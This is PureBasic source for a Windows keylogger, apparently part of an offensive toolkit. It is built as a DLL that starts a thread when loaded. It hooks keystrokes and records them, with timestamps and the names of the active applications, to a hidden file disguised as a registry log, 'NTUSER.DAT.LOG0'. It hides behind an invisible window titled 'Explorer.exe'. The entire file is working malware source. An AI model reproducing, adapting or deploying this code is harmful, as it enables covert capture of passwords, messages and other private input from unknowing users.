; ***************************************************************************
; *                                                                         *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; * License:     BSD License                                                *
; * Copyright:   (c) 2012, a12d404.net                                      *
; * Status:      Prototype                                                  *
; *                                                                         *
; ***************************************************************************
EnableExplicit

XIncludeFile("lib/kernel32.pbi")
XIncludeFile("processes/keylogger.pbi")

; ---------------------------------------------------------------------------
;- Consts
#MAX_WAIT             = 4 ; seconds
#BUFFER_SIZE          = 4 ; MB
#KEYLOGGER_FILE_NAME  = "NTUSER.DAT.LOG0"

; ---------------------------------------------------------------------------
;- Types
  

; ---------------------------------------------------------------------------
;- Prototypes


; ---------------------------------------------------------------------------
;- Variables
Global Mutex
Global hFile.i = 0
Define Quit.i = 0

; ---------------------------------------------------------------------------
;- Procedures

; ***************************************************************************
; * Sample -- Does nothing ... really!                                      *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
;Procedure.b Sample(param.l)
;   Define res.b
;   
; SampleCleanup:
;   
;   ProcedureReturn res
; SampleError:
;   res = #False
;   Goto SampleCleanup
;EndProcedure

; ***************************************************************************
; * KeyloggerEventProc --                                                   *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure KeyloggerEventProc(activeApplicationTitle.s, activeApplicationExe.s, sameActiveApp.b, key.i)
  Shared Mutex
  Shared hFile
  Define tmpStr.s = ""
  
  LockMutex(Mutex)
  
  If Not sameActiveApp
    WriteString(hFile, #CRLF$ + #CRLF$ + FormatDate("%yyyy-%mm-%dd %hh:%ii:%ss", Date()) + " - " + activeApplicationExe + " - " + activeApplicationTitle + #CRLF$)
  EndIf
  
  WriteString(hFile, GetPressedKeyByVKey(key))
  FlushFileBuffers(hFile)
  
  UnlockMutex(Mutex)
EndProcedure

; ---------------------------------------------------------------------------

Procedure LoadMe(*Value)
  Shared Mutex
  Shared hFile
  
  If Not Load_Kernel32()
    Goto LoadMeCleanup
  EndIf
  
  ; Wait for DLL initialization
  Sleep(#MAX_WAIT*1000)
  
  Mutex = CreateMutex()
  
  hFile = OpenFile(#PB_Any, GetHomeDirectory() + "\" + #KEYLOGGER_FILE_NAME)
  If Not hFile
    Goto LoadMeCleanup
  EndIf
  FileSeek(hFile, Lof(hFile))
  
  If Not Load_keylogger(@KeyloggerEventProc())
    Goto LoadMeCleanup
  EndIf
  
  If OpenWindow(0, 0, 0, 1, 1, "Explorer.exe", #PB_Window_Invisible)
    While #True
      If WaitWindowEvent() = #PB_Event_CloseWindow
        Break
      EndIf
    Wend
  EndIf
  
  MessageRequester("Debug", "Ende")
  
LoadMeCleanup:
  Unload_keylogger()
  FlushFileBuffers(hFile)
  Unload_Kernel32()
EndProcedure


ProcedureDLL AttachProcess(Instance)
  CreateThread(@LoadMe(), #Null)
EndProcedure

;Debug Unload_keylogger()

LoadMe(#Null)

; IDE Options = PureBasic 4.60 RC 1 (Windows - x64)
; CursorPosition = 124
; FirstLine = 58
; Folding = -
; EnableXP
; EnablePurifier
; EnableCompileCount = 0
; EnableBuildCount = 0
; EnableExeConstant